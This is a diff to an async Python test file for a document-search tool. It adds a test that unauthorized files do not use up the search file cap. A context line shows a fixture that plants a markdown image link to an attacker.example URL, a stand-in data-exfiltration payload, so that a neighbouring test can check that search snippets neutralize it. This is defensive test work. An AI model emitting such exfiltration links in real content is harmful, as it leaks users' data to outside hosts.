@@ -16,6 +16,26 @@ async def test_finds_matches_across_corpus(docs):
     assert paths == {"a.txt", "c.txt"}
 
 
+async def test_unauthorized_files_do_not_consume_the_search_cap(
+    docs, monkeypatch
+):
+    monkeypatch.setenv("ARROWHEAD_AUTH_ENABLED", "true")
+    monkeypatch.setenv(
+        "ARROWHEAD_AUTHZ_POLICY",
+        '{"grants": [{"subject": "*", "actions": ["search", "read"],'
+        ' "prefix": "z/"}]}',
+    )
+    monkeypatch.setenv("ARROWHEAD_SEARCH_MAX_FILES", "2")
+    get_settings.cache_clear()
+    get_authorizer.cache_clear()
+    for index in range(5):
+        (docs / f"a{index}.txt").write_text("the deadline is friday")
+    (docs / "z").mkdir()
+    (docs / "z" / "hit.txt").write_text("the deadline is friday")
+    result = await doc_search("deadline")
+    assert {match["path"] for match in result["matches"]} == {"z/hit.txt"}
+
+
 async def test_snippet_exfiltration_neutralized(docs):
     (docs / "note.md").write_text("![x](http://attacker.example/?s=1) deadline")
     result = await doc_search("deadline")
